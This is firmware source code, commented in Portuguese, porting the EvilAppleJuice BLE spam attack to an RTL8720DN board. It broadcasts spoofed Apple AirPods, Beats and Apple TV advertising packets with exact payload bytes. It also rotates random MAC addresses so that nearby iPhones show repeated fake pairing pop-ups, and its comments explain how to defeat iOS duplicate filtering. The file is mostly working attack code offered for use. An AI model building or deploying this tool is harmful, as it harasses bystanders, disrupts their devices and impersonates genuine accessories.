// =========================================================
// BLE Spam – Port of EvilAppleJuice-ESP32 para RTL8720DN BW16
// Original: github.com/EvilAppleJuice-ESP32
//
// Adaptações para Ameba SDK (BLEDevice.h v3.1.9):
//  - Objeto global é BLE (extern BLEDevice BLE), não BLEDevice::xxx
//  - BLEAdvert::setAdvData(uint8_t*, uint8_t) aceita buffer raw
//  - MAC aleatório via le_set_rand_addr() + GAP_PARAM_ADV_LOCAL_ADDR_TYPE
//  - Reconfiguração só com o advertising em GAP_ADV_STATE_IDLE
//  - PDU fixo ADV_NONCONN_IND (não conectável)
// =========================================================

// STL primeiro para evitar conflito com macros do Ameba
#undef max
#include <vector>
#include <stdio.h>

#include "ble_spam.h"
#include "debug.h"

// =========================================================
// Ajustes de compatibilidade com o RTL8720DN (BW16)
//
// ROTACAO DE MAC (o que faz o iPhone mostrar VARIOS popups):
//   O iOS identifica um acessorio pelo endereco de origem do advertising
//   (AdvA). Enquanto o AdvA nao muda, ele mostra um popup e descarta os
//   pacotes seguintes como "o mesmo dispositivo". A solucao e trocar o
//   endereco aleatorio do controller entre ciclos:
//
//       le_adv_stop()                  -> advertising precisa estar IDLE
//       le_set_rand_addr(mac)          -> HCI LE Set Random Address
//       le_adv_set_param(ADV_LOCAL_ADDR_TYPE, RANDOM)
//       le_adv_start()                 -> LE Set Adv Params usa own_addr_type=1
//
//   Detalhes que importam:
//    - O array de endereco do SDK e LITTLE-ENDIAN (mac[0] = LSB,
//      mac[5] = MSB). Endereco estatico aleatorio exige os 2 bits mais
//      significativos = 11 -> mac[5] |= 0xC0. (O BLEAddr::str() do core
//      imprime _btAddr[5] primeiro, o que confirma a ordem.)
//    - le_set_rand_addr() so confirma o ENFILEIRAMENTO do comando HCI.
//      Se o controller recusar o endereco, LE Set Advertising Enable
//      tambem falha e o GAP nunca entra em GAP_ADV_STATE_ADVERTISING.
//      Por isso o ciclo abaixo espera esse estado: e a nossa prova, no
//      proprio firmware, de que o MAC novo foi aceito.
//    - BLE_SPAM_REPEAT mantem a mesma identidade por alguns ciclos com o
//      advertising rodando sem parar, para o iOS ter tempo de registrar
//      aquele MAC antes do proximo aparecer.
// =========================================================
#ifndef BLE_SPAM_ROTATE_MAC
#define BLE_SPAM_ROTATE_MAC BLE_MAC_ROTATE
#endif
#ifndef BLE_SPAM_REPEAT
#define BLE_SPAM_REPEAT 1
#endif
#ifndef BLE_MAC_LOG_EVERY
#define BLE_MAC_LOG_EVERY 1
#endif

extern "C" {
#include "gap.h"
#include "gap_adv.h"
#include "gap_le.h"
#include "gap_le_types.h"
#include "gap_msg.h"

// Comando vendor do core (vendor_cmd_bt.h, implementado em
// lib_arduino.a:vendor_cmd.o). Assinatura identica a do header do SDK;
// declaramos aqui para nao puxar as dependencias de console do board.
// O vendor_cmd_init() roda no start do stack (ble_app_main.o), entao a
// chamada so vale depois de BLE.beginPeripheral().
T_GAP_CAUSE le_adv_set_tx_power(uint8_t option, uint8_t tx_gain);
}

// =========================================================
// Tabela de dispositivos Apple (port direto de devices.hpp)
// =========================================================
const AppleDevice ALL_APPLE_DEVICES[] = {
  // ---- Audio (APPLE_AUDIO): payload 31 bytes, modelId no byte 7 ----
  {"Airpods",                0x02, APPLE_AUDIO},
  {"Power Beats",            0x03, APPLE_AUDIO},
  {"Beats X",                0x05, APPLE_AUDIO},
  {"Beats Solo 3",           0x06, APPLE_AUDIO},
  {"Beats Studio 3",         0x09, APPLE_AUDIO},
  {"Airpods Max",            0x0a, APPLE_AUDIO},
  {"Power Beats Pro",        0x0b, APPLE_AUDIO},
  {"Beats Solo Pro",         0x0c, APPLE_AUDIO},
  {"Airpods Pro",            0x0e, APPLE_AUDIO},
  {"Airpods Gen 2",          0x0f, APPLE_AUDIO},
  {"Beats Flex",             0x10, APPLE_AUDIO},
  {"Beats Studio Buds",      0x11, APPLE_AUDIO},
  {"Beats Fit Pro",          0x12, APPLE_AUDIO},
  {"Airpods Gen 3",          0x13, APPLE_AUDIO},
  {"Airpods Pro Gen 2",      0x14, APPLE_AUDIO},
  {"Beats Studio Buds+",     0x16, APPLE_AUDIO},
  {"Beats Studio Pro",       0x17, APPLE_AUDIO},
  {"Airpods Pro G2 USB-C",   0x24, APPLE_AUDIO},
  {"Beats Solo 4",           0x25, APPLE_AUDIO},
  {"Beats Solo Buds",        0x26, APPLE_AUDIO},
  {"Software Update",        0x2e, APPLE_AUDIO},
  {"Powerbeats Fit",         0x2f, APPLE_AUDIO},
  // ---- Setup (APPLE_SETUP): payload 23 bytes, modelId no byte 13 ----
  {"AppleTV Setup",          0x01, APPLE_SETUP},
  {"Transfer Number",        0x02, APPLE_SETUP},
  {"AppleTV Pair",           0x06, APPLE_SETUP},
  {"Setup New Phone",        0x09, APPLE_SETUP},
  {"Homepod Setup",          0x0b, APPLE_SETUP},
  {"AppleTV Homekit",        0x0d, APPLE_SETUP},
  {"AppleTV Keyboard",       0x13, APPLE_SETUP},
  {"TV Color Balance",       0x1e, APPLE_SETUP},
  {"AppleTV New User",       0x20, APPLE_SETUP},
  {"Vision Pro",             0x24, APPLE_SETUP},
  {"AppleTV Conn Net",       0x27, APPLE_SETUP},
  {"AppleTV AppleID",        0x2b, APPLE_SETUP},
  {"AppleTV Audio Sync",     0xc0, APPLE_SETUP},
};

// =========================================================
// generateApplePacket – port de devices.cpp::generatePacket
//
// Retorna um buffer ADV record completo (já com length + type + OUI):
//  APPLE_AUDIO → 31 bytes: [0x1e][0xff][0x4c][0x00][0x07][0x19][0x07][modelId][body×11]
//  APPLE_SETUP → 23 bytes: [0x16][0xff][0x4c][0x00][prefix×9][modelId][suffix×9]
// =========================================================
static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
  memset(buf, 0, 31);

  if (dev.type == APPLE_AUDIO) {
    // Payload EXATO do EvilAppleJuice-ESP32 (src/devices.cpp).
    // ATENÇÃO: o corpo NÃO pode ser randomizado. iOS valida a estrutura do
    // "Proximity Pairing" e descarta o pacote se 0x75 / 0x30 / 0x45 forem
    // alterados — era exatamente esse o bug que impedia os popups.
    static const uint8_t header[7] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
    static const uint8_t body[11] = {0x20, 0x75, 0xaa, 0x30, 0x01,
                                     0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
    memcpy(buf, header, sizeof(header));
    buf[7] = dev.modelId;          // Model ID
    memcpy(buf + 8, body, sizeof(body));
    // bytes 19..30 = 0x00 (já zerados pelo memset)
    return 31;
  } else {
    // APPLE_SETUP — 23 bytes (mantido igual, já funcionava)
    const uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
    const uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf, prefix, 13);
    buf[13] = dev.modelId;
    memcpy(buf + 14, suffix, 9);
    return 23; // Total length: 1 AD len + 22 data bytes
  }
}

// =========================================================
// Runtime state
// =========================================================
bool     isBleSpamming = false;
uint32_t ble_pkt_sent  = 0;
uint8_t  ble_spam_idx  = 0;
bool     ble_focused_mode = false; // false=ALL(22 devices), true=FOCUSED(AirPods only)

static bool ble_initialized = false;   // spam ativo (advertising rodando)
static bool ble_stack_ready = false;   // stack BLE/GAP inicializado
static uint32_t ble_last_tx_ms = 0;    // diagnostico de cadencia

static uint8_t  ble_cur_mac[6] = {0};  // ultimo MAC aplicado (LSB-first)
static char     ble_cur_mac_str[18] = "--:--:--:--:--:--";
static bool     ble_cur_mac_random = false;
static uint8_t  ble_mac_fail_streak = 0;   // falhas consecutivas na troca
static uint8_t  ble_repeat_left = 0;       // ciclos restantes com a mesma identidade
static uint8_t  ble_adv_warned = 0;        // evita repetir o mesmo aviso no serial

// =========================================================
// Helpers de advertising (SDK Ameba)
// =========================================================

// Espera o GAP confirmar que o advertising parou (gap_adv_state == IDLE).
// CRITICO: o SDK so aceita alteracao de parametros de advertising e de
// endereco aleatorio quando o estado e IDLE. Se chamarmos
// le_adv_set_param()/le_set_rand_addr() enquanto o stop ainda esta
// pendente, o stack ignora tudo silenciosamente (HCI "command disallowed").
static bool adv_wait_idle(uint32_t timeout_ms) {
  uint32_t start = millis();
  T_GAP_DEV_STATE st;
  while (millis() - start < timeout_ms) {
    if (le_get_gap_param(GAP_PARAM_DEV_STATE, &st) == GAP_CAUSE_SUCCESS) {
      if (st.gap_init_state != GAP_INIT_STATE_STACK_READY) return false;
      if (st.gap_adv_state == GAP_ADV_STATE_IDLE) return true;
    }
    delay(2);
  }
  return false;
}

// Espera o advertising entrar em ADVERTISING.
// Isto e a prova local de que o controller ACEITOU o endereco aleatorio:
// se o MAC fosse invalido, LE_Set_Advertising_Enable falharia e o GAP
// ficaria preso em IDLE/STARTING.
static bool adv_wait_advertising(uint32_t timeout_ms) {
  uint32_t start = millis();
  T_GAP_DEV_STATE st;
  while (millis() - start < timeout_ms) {
    if (le_get_gap_param(GAP_PARAM_DEV_STATE, &st) == GAP_CAUSE_SUCCESS &&
        st.gap_adv_state == GAP_ADV_STATE_ADVERTISING) {
      return true;
    }
    delay(1);
  }
  return false;
}

// Aplica o tipo de endereco, sobe o advertising e confirma que ele entrou
// em ADVERTISING. Devolve false (e o cause do start) se algo falhou.
static bool adv_try_start(uint8_t addr_type, uint8_t* cause_out) {
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(addr_type), &addr_type);
  T_GAP_CAUSE cause = le_adv_start();
  if (cause_out) *cause_out = (uint8_t)cause;
  if (cause != GAP_CAUSE_SUCCESS) return false;
  return adv_wait_advertising(25);
}

static void ble_format_mac(const uint8_t* mac) {
  static const char hexd[] = "0123456789ABCDEF";
  uint8_t o = 0;
  for (int8_t i = 5; i >= 0; i--) {   // imprime MSB -> LSB (formato humano)
    ble_cur_mac_str[o++] = hexd[(mac[i] >> 4) & 0x0F];
    ble_cur_mac_str[o++] = hexd[mac[i] & 0x0F];
    if (i > 0) ble_cur_mac_str[o++] = ':';
  }
  ble_cur_mac_str[o] = '\0';
}

// Gera e aplica um novo endereco estatico aleatorio.
// Retorna o tipo de endereco a usar no advertising: RANDOM em caso de
// sucesso, PUBLIC como fallback (melhor anunciar com o MAC do chip do que
// nao anunciar nada).
static uint8_t adv_apply_new_random_mac() {
  if (!BLE_SPAM_ROTATE_MAC) {
    ble_cur_mac_random = false;
    return GAP_LOCAL_ADDR_LE_PUBLIC;
  }

  uint8_t mac[6];

  for (uint8_t attempt = 0; attempt < 3; attempt++) {
    // 1) tenta um endereco gerado por nos
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(256);
    // Static Random Address: bits 7:6 do octeto MAIS significativo = 11.
    // O array do SDK e little-endian, entao o MSB e mac[5].
    mac[5] = (uint8_t)((mac[5] & 0x3F) | 0xC0);
    // nunca gera 00:00:00:00:00:00 (invalido para o controller)
    if (!(mac[0] | mac[1] | mac[2] | mac[3] | mac[4])) mac[4] = 0x01;

    if (le_set_rand_addr(mac) == GAP_CAUSE_SUCCESS) goto applied;

    // 2) fallback: deixa o proprio controller gerar um endereco valido
    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, mac) == GAP_CAUSE_SUCCESS &&
        le_set_rand_addr(mac) == GAP_CAUSE_SUCCESS) {
      goto applied;
    }
    delay(2);
  }

  // Falhou 3x. NAO desiste em definitivo: a proxima rotacao tenta de novo
  // (uma falha pode ser transitória, ex.: comando HCI ainda pendente).
  ble_mac_fail_streak++;
  ble_cur_mac_random = false;
  if (ble_mac_fail_streak <= 3 || (ble_mac_fail_streak % 25) == 0) {
    DEBUG_SER_PRINT("[BLE] AVISO: le_set_rand_addr falhou ");
    DEBUG_SER_PRINT((int)ble_mac_fail_streak);
    DEBUG_SER_PRINT("x -> usando MAC publico neste ciclo\n");
  }
  return GAP_LOCAL_ADDR_LE_PUBLIC;

applied:
  memcpy(ble_cur_mac, mac, 6);
  ble_format_mac(ble_cur_mac);
  ble_cur_mac_random = true;
  ble_mac_fail_streak = 0;
  return GAP_LOCAL_ADDR_LE_RANDOM;
}

// =========================================================
// Potencia de TX do advertising
//
// O core expoe o comando vendor HCI 0xFD80 / sub 0x00 (encapsulado em
// le_adv_set_tx_power()), que ajusta o ganho do advertising LE no
// controller. E um ajuste POR DISPOSITIVO (nao por advertising), entao
// uma chamada por sessao basta: o valor sobrevive aos stop/start que a
// rotacao de MAC faz.
//
// Importante: o retorno desta funcao so diz se o comando foi ENFILEIRADO
// (GAP_CAUSE_SUCCESS). A confirmacao final vem em GAP_MSG_VENDOR_CMD_RSP,
// que exige gap_register_vendor_cb() — nao registramos para nao sobrescrever
// o callback do vendor_cmd.o/coex do core.
// =========================================================
static void ble_apply_tx_power() {
#if (BLE_TX_GAIN > 0)
  T_GAP_CAUSE cause = le_adv_set_tx_power(0, (uint8_t)BLE_TX_GAIN);
  char line[80];
  snprintf(line, sizeof(line),
           "[BLE] TX power gain=0x%02X -> %s (cause=%u)\n",
           (unsigned)BLE_TX_GAIN,
           (cause == GAP_CAUSE_SUCCESS) ? "enviado" : "FALHOU",
           (unsigned)cause);
  DEBUG_SER_PRINT(line);
#else
  DEBUG_SER_PRINT("[BLE] TX power: default do driver (BLE_TX_GAIN=0)\n");
#endif
}

// =========================================================
// ble_spam_next – mantem/renova a identidade e (re)inicia o advertising
//
// Fluxo por ciclo:
//   - se ainda estamos repetindo a mesma identidade, nao toca em nada:
//     o advertising continua no ar a 20 ms e o iOS recebe varios pacotes
//     daquele MAC antes do proximo aparecer.
//   - senao: para o adv, troca o MAC aleatorio, troca o payload, sobe
//     o adv de novo e CONFIRMA que ele entrou em ADVERTISING.
// =========================================================
void ble_spam_next() {
  if (!ble_initialized || !ble_stack_ready) return;

  // --- 1) Repeticao da mesma identidade (MAC + payload) -----------------
  if (ble_repeat_left > 0) {
    ble_repeat_left--;
    ble_pkt_sent++;
    return;
  }

  // --- 2) Escolhe o proximo dispositivo --------------------------------
  if (ble_focused_mode) {
    // MODO FOCUSED: so AirPods (idx=0). O payload e sempre o mesmo; o que
    // muda a cada ciclo e o MAC, e e isso que gera popups repetidos.
    ble_spam_idx = 0;
  } else {
    // MODO ALL: cicla pelos dispositivos APPLE_AUDIO
    do {
      ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
    } while (ALL_APPLE_DEVICES[ble_spam_idx].type != APPLE_AUDIO);
  }

  const AppleDevice& dev = ALL_APPLE_DEVICES[ble_spam_idx];

  // Constrói o payload Apple (AD record raw)
  uint8_t packet[31];
  uint8_t pktLen = generateApplePacket(dev, packet);

  BLEAdvert* advert = BLE.configAdvert();

  // --- 3) Para o advertising e espera o stack confirmar IDLE -----------
  le_adv_stop();
  if (!adv_wait_idle(250)) {
    // Sem IDLE o stack ignora troca de endereco/parametros. Nao adianta
    // seguir: mantem a identidade atual e tenta de novo no proximo ciclo.
    ble_repeat_left = 0;
    if (ble_adv_warned < 3) {
      ble_adv_warned++;
      DEBUG_SER_PRINT("[BLE] AVISO: adv nao ficou IDLE a tempo (stop pendente)\n");
    }
    return;
  }

  // --- 4) Novo MAC aleatorio ANTES de reconfigurar o advertising -------
  uint8_t adv_addr_type = adv_apply_new_random_mac();
  if (adv_addr_type == GAP_LOCAL_ADDR_LE_RANDOM) {
    // Garante que o HCI LE_Set_Random_Address chegue ao controller ANTES
    // do LE_Set_Advertising_Enable, senao ele sobe com o endereco anterior.
    delay(4);
  }

  // --- 5) Payload e parametros do advertising -------------------------
  // ADV sempre nao-conectavel: ADV_IND/SCAN_IND fariam o iPhone tentar
  // conectar e interromper o advertising.
  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  advert->setMinInterval(20); // 20 ms — Apple recomenda p/ descoberta (QA1931)
  advert->setMaxInterval(20);
  advert->setAdvData(packet, pktLen);
  advert->updateAdvertParams();

  // --- 6) Sobe o advertising e confirma no GAP ------------------------
  uint8_t start_cause = 0;
  bool advertising = adv_try_start(adv_addr_type, &start_cause);

  if (!advertising && adv_addr_type == GAP_LOCAL_ADDR_LE_RANDOM) {
    // Recuperacao: se o controller recusou o endereco aleatorio (ou o
    // enable falhou), para tudo e sobe de novo com o MAC publico. Assim
    // NUNCA ficamos sem advertising — no pior caso perdemos a rotacao.
    le_adv_stop();
    adv_wait_idle(250);
    uint8_t pub_cause = 0;
    if (adv_try_start(GAP_LOCAL_ADDR_LE_PUBLIC, &pub_cause)) {
      ble_cur_mac_random = false;
      if (ble_adv_warned < 3) {
        ble_adv_warned++;
        DEBUG_SER_PRINT("[BLE] AVISO: falha com MAC aleatorio (cause=0x");
        DEBUG_SER_PRINT((int)start_cause, HEX);
        DEBUG_SER_PRINT(") -> anunciando com MAC publico\n");
      }
      advertising = true;
    } else {
      ble_adv_warned = 3;
      DEBUG_SER_PRINT("[BLE] ERRO: le_adv_start falhou tambem com MAC publico (0x");
      DEBUG_SER_PRINT((int)pub_cause, HEX);
      DEBUG_SER_PRINT(")\n");
    }
  }

  if (!advertising) {
    ble_repeat_left = 0;   // força nova tentativa no proximo ciclo
    return;
  }

  // Identidade no ar confirmada: segura ela por BLE_SPAM_REPEAT ciclos.
  ble_repeat_left = (BLE_SPAM_REPEAT > 0) ? (uint8_t)(BLE_SPAM_REPEAT - 1) : 0;
  ble_pkt_sent++;

#if BLE_MAC_LOG_EVERY
  {
    uint8_t rb = 0xFF;
    le_adv_get_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, &rb);
    char line[128];
    snprintf(line, sizeof(line),
             "[BLE] %s id=0x%02X len=%u mac=%s%s type=%u(%s) dt=%lums\n",
             dev.name, dev.modelId, pktLen,
             ble_cur_mac_str,
             ble_cur_mac_random ? "" : "(PUB)",
             rb,
             (rb == GAP_LOCAL_ADDR_LE_RANDOM) ? "RAND" : "PUB",
             (unsigned long)(millis() - ble_last_tx_ms));
    DEBUG_SER_PRINT(line);
  }
#endif
  ble_last_tx_ms = millis();
}

// =========================================================
// start_ble_spam
// =========================================================
void start_ble_spam() {
  if (ble_initialized) return;

  DEBUG_SER_PRINT(ble_focused_mode ? "[BLE] Modo FOCUSED: AirPods spam continuo\n"
                                   : "[BLE] Modo ALL: 22 dispositivos AUDIO\n");

  if (!ble_stack_ready) {
    BLE.init();

    // Configura parâmetros base ANTES de subir o stack: quando o GAP fica
    // pronto o callback do SDK chama le_adv_start() automaticamente, então o
    // primeiro advertising já precisa ter um payload Apple válido.
    BLEAdvert* advert = BLE.configAdvert();
    advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
    advert->setMinInterval(20);
    advert->setMaxInterval(20);

    uint8_t first[31];
    uint8_t firstLen = generateApplePacket(ALL_APPLE_DEVICES[AIRPODS], first);
    advert->setAdvData(first, firstLen);
    advert->updateAdvertParams();

    DEBUG_SER_PRINT("[BLE] Inicializando stack BLE (aguarde)...\n");
    BLE.beginPeripheral();   // aguarda GAP_INIT_STATE_STACK_READY
    ble_stack_ready = true;
    DEBUG_SER_PRINT("[BLE] Stack BLE pronto.\n");

    // vendor_cmd_init() ja rodou no start do stack: agora o comando vendor
    // de potencia de advertising e aceito.
    ble_apply_tx_power();
  }

  ble_initialized = true;
  isBleSpamming   = true;
  ble_pkt_sent    = 0;
  ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // next() vai para AIRPODS (idx=0, primeiro AUDIO)
  ble_mac_fail_streak = 0;
  ble_repeat_left = 0;
  ble_adv_warned  = 0;
  ble_last_tx_ms  = millis();

  // Semente diferente a cada boot + MAC publico do chip, para o primeiro
  // endereco aleatorio nao se repetir entre reinicializacoes.
  {
    uint8_t pub[6] = {0};
    BLE.getLocalAddr(pub);
    randomSeed(micros() ^ ((uint32_t)pub[0] << 16) ^ ((uint32_t)pub[1] << 8) ^ pub[2]);
  }

  DEBUG_SER_PRINT("[BLE] Pronto. Iniciando broadcast...\n");
#if BLE_MAC_ROTATE
  DEBUG_SER_PRINT("[BLE] Rotacao de MAC: ON (repete ");
  DEBUG_SER_PRINT((int)BLE_SPAM_REPEAT);
  DEBUG_SER_PRINT(" ciclo(s) por identidade)\n");
#else
  DEBUG_SER_PRINT("[BLE] Rotacao de MAC: OFF (MAC publico fixo)\n");
#endif
  ble_spam_next(); // primeiro pacote imediato
}

// =========================================================
// stop_ble_spam
// =========================================================
void stop_ble_spam() {
  isBleSpamming = false;
  if (ble_initialized) {
    le_adv_stop();
    adv_wait_idle(100);
    ble_initialized = false;
    DEBUG_SER_PRINT("[BLE] BLE spam parado.\n");
  }

  // NÃO chamamos BLE.end(): o stack da Ameba não reinicializa de forma
  // confiável e um segundo start() podia travar o firmware. O stack fica
  // pronto e apenas o advertising é interrompido.
}